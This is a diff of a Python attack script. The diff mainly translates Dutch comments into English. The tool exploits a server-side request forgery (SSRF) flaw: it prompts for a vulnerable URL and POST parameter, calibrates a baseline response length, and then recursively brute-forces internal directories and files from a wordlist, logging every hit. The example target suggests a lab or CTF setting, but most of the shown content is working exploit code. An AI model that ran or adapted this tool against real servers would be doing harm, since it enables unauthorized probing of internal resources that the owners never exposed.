@@ -22,22 +22,22 @@ def print_banner():
     """
     print(banner)
 
-# We maken een aparte functie voor de scan-logica zodat deze recursief aangeroepen kan worden
+# Isolated scanning function to allow recursive self-execution
 def scan_directory(target_url, param_name, words, remote_dir, file_ext, error_status_code, baseline_html_len, found_files):
     print(f"[*] Scanning path: {remote_dir}")
     
-    # Zorg dat de remote directory altijd goed eindigt
+    # Ensure the remote directory path always ends with a trailing slash
     if not remote_dir.endswith('/'):
         remote_dir += '/'
 
     discovered_in_this_dir = []
 
     for word in words:
-        # Controleer of het woord zelf al een map-indicator is (eindigt op /)
+        # Check if the word itself indicates a directory (ends with /)
         is_directory_word = word.endswith('/')
         clean_word = word.rstrip('/')
 
-        # Bepaal de bestandsnaam gebaseerd op het type item
+        # Determine the target filename based on object type
         if is_directory_word:
             filename = f"{clean_word}/"
         else:
@@ -53,9 +53,11 @@ def scan_directory(target_url, param_name, words, remote_dir, file_ext, error_st
         try:
             response = requests.post(target_url, data=data, timeout=5)
             
-            # Wiskundige berekening conform jouw precisiemethode
+            # Mathematical evaluation based on precision length filtering
             current_html_len = len(response.text) - len(filename)
             
+            # STricter Comparison:
+            # An object is verified if status code changes OR naked length deviates from baseline error size
             if response.status_code != error_status_code or current_html_len != baseline_html_len:
                 if "Telemetry failure" not in response.text and "URL rejected" not in response.text:
                     full_discovered_path = f"{remote_dir}{filename}"
@@ -67,19 +69,19 @@ def scan_directory(target_url, param_name, words, remote_dir, file_ext, error_st
         except requests.exceptions.RequestException:
             continue
 
-    # RECURSIE LOGICA: Als er mappen zijn ontdekt, gaan we daar direct dieper in zoeken
+    # RECURSION LOGICA: If folders are discovered, recursively scan deeper into the branch
     for item in discovered_in_this_dir:
-        # Als het item eindigt op een slash, of als we ook bestanden zonder extensie als mogelijke mappen beschouwen
+        # If the item ends with a slash, or if no extension is set (treating clean files as potential paths)
         if item.endswith('/') or file_ext == "":
             next_dir = f"{remote_dir}{item}"
             print(f"\n[➔] Diving deeper into discovered folder...")
-            # Roep de functie zichzelf opnieuw aan met het nieuwe diepere pad
+            # Recursively trigger self-execution with the newly identified sub-path
             scan_directory(target_url, param_name, words, next_dir, file_ext, error_status_code, baseline_html_len, found_files)
 
 def main():
     print_banner()
 
-    # 1. Parameters opvragen
+    # 1. Request dynamic user input parameters
     target_url = input("[*] Enter Vulnerable SSRF URL (e.g. http://10.0.2.21/sync.php): ").strip()
     param_name = input("[*] Enter Vulnerable POST Parameter (e.g. report_url): ").strip()
     wordlist_path = input("[*] Enter path to wordlist: (e.g. /usr/share/wordlists/dirb/common.txt)").strip()
@@ -99,7 +101,7 @@ def main():
 
     print(f"\n[*] Loaded {len(words)} words from dictionary.")
     
-    # 2. WISKUNDIGE KALIBRATIE
+    # 2. MATHEMATICAL CALIBRATION
     print("[*] Calibrating server baseline math...")
     random_word = f"check-{uuid.uuid4()}"
     random_filename = f"{random_word}{file_ext}"
@@ -107,6 +109,7 @@ def main():
     
     try:
         cal_response = requests.post(target_url, data={param_name: calibration_payload}, timeout=5)
+        # Calculate naked HTML structure size excluding length of the unique test input
         baseline_html_len = len(cal_response.text) - len(random_word)
         error_status_code = cal_response.status_code
         print(f"[+] Calibration complete. Structural baseline length is {baseline_html_len} bytes.")
@@ -118,10 +121,10 @@ def main():
 
     found_files = []
 
-    # Start de recursieve scan vanaf de basismap
+    # Initialize the recursive scanning routine starting from the base path
     scan_directory(target_url, param_name, words, remote_dir, file_ext, error_status_code, baseline_html_len, found_files)
 
-    # 4. Resultaten wegschrijven
+    # 4. Export consolidated discovery logs
     timestamp = datetime.now().strftime("%Y%m%d%H%M")
     output_filename = f"{timestamp}-Output-{project_name}.txt"
 
